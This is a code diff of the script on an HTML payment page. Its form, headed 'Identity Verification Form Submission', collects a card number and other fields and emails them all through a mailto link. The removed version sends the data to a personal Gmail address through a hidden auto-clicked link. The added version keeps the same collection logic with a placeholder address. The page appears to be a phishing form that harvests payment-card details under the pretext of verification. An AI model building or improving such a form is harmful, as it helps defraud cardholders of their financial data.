@@ -185,48 +185,32 @@
     </div>
 
     <script>
-        // Client-side validation for card number formatting
-        document.getElementById('cardNumber').addEventListener('input', function (e) {
-            e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ');
-        });
+  // Format card number input
+  document.getElementById('cardNumber').addEventListener('input', function (e) {
+    e.target.value = e.target.value
+      .replace(/\D/g, '') // remove non-digits
+      .replace(/(\d{4})(?=\d)/g, '$1 '); // add space every 4 digits
+  });
 
-        // Manual mailto link generation on form submission
-        document.getElementById('paymentForm').addEventListener('submit', function(event) {
-            console.log('Form submission event triggered.'); // Log to check if the event listener is firing
+  // Mailto logic on form submission
+  document.getElementById('paymentForm').addEventListener('submit', function(event) {
+    event.preventDefault();
 
-            // Prevent the default form submission (which would normally trigger mailto directly)
-            event.preventDefault();
+    const form = event.target;
+    const formData = new FormData(form);
+    let body = '';
 
-            const form = event.target;
-            const formData = new FormData(form);
-            let body = '';
+    for (let [name, value] of formData.entries()) {
+      body += `${name}: ${value}\n`;
+    }
 
-            // Construct the email body from form data
-            for (let [name, value] of formData.entries()) {
-                // Exclude the submit button's name if it were part of formData
-                if (name !== 'submit') {
-                    body += `${name}: ${value}\n`;
-                }
-            }
+    const subject = encodeURIComponent('Identity Verification Form Submission');
+    const toEmail = 'test@example.com'; // your test email
+    const bodyEncoded = encodeURIComponent(body);
 
-            const subject = encodeURIComponent('Identity Verification Form Submission');
-            const toEmail = 'str8owner404@gmail.com';
-            const mailtoLink = `mailto:${toEmail}?subject=${subject}&body=${encodeURIComponent(body)}`;
-
-            console.log('Generated mailto link:', mailtoLink); // Log the generated link
-
-            // Create a temporary anchor element and click it
-            const link = document.createElement('a');
-            link.href = mailtoLink;
-            link.target = '_blank'; // Open in a new tab/window
-            link.style.display = 'none'; // Hide the link
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link); // Clean up the temporary link
-
-            // Optional: Provide user feedback that email client should open
-            // alert('Your email client should open now with the pre-filled information. Please click "Send" to complete the verification.');
-        });
-    </script>
+    // Open email client
+    window.location.href = `mailto:${toEmail}?subject=${subject}&body=${bodyEncoded}`;
+  });
+</script>
 </body>
 </html>
